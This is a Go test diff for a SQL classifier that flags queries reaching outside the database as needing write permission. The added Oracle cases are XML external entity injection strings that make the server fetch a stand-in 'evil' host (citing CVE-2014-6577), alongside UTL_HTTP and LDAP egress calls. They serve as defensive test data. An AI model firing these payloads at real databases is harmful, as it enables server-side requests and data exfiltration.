@@ -45,6 +45,12 @@ func TestClassifySQLEgress(t *testing.T) {
 		"oracle": {
 			"SELECT UTL_HTTP.REQUEST('http://evil') FROM dual", "SELECT utl_inaddr.get_host_address('x.evil') FROM dual",
 			"SELECT * FROM t@lnk", "SELECT DBMS_LDAP.INIT('evil',389) FROM dual", "SELECT HTTPURITYPE('http://evil').getclob() FROM dual",
+			// XML built in the query may name an external DTD or entity that
+			// the parser fetches (CVE-2014-6577 on unpatched servers)
+			`SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://evil/">%x;]>'),'/l') FROM dual`,
+			`SELECT extractvalue(sys.xmltype(chr(60)||'!DOCTYPE r SYSTEM "http://evil/"><r/>'),'/r') FROM dual`,
+			`SELECT XMLPARSE(DOCUMENT '<!DOCTYPE r SYSTEM "http://evil/"><r/>') FROM dual`,
+			`SELECT xmltype.createxml('<!DOCTYPE r SYSTEM "http://evil/"><r/>') FROM dual`,
 		},
 		"snowflake": {"COPY INTO @stage FROM t"},
 		"bigquery":  {"SELECT * FROM EXTERNAL_QUERY('conn','select 1')", "EXPORT DATA OPTIONS(uri='gs://x/*') AS SELECT 1"},
@@ -59,6 +65,10 @@ func TestClassifySQLEgress(t *testing.T) {
 				t.Errorf("%s %q: runs without --write", kind, q)
 			}
 		}
+	}
+	// XML parsed from a column stays a read
+	if p, err := ClassifySQL("oracle", "SELECT extractvalue(xmltype(doc), '/a') FROM docs"); err != nil || p.NeedsWrite() {
+		t.Errorf("oracle xmltype(column): %v %v, want a read", err, p.RuleIDs)
 	}
 	// a three-part name is a database on the same server: a read
 	for _, q := range []string{"SELECT * FROM db.dbo.t", "SELECT t.a, s.b FROM db.dbo.t t JOIN s ON t.a = s.a", "SELECT 1.5"} {
